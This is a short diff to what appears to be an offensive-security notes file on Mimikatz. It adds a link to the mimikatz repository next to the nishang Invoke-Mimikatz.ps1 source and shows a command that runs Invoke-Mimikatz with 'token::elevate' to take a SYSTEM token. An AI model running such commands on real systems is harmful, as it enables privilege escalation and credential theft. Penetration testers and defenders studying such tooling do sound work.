@@ -1,5 +1,6 @@
 # source 
 https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1
+https://github.com/gentilkiwi/mimikatz
 
 # elevate to system ("token::revert" to drop token)
 Invoke-Mimikatz -Command '"token::elevate"'
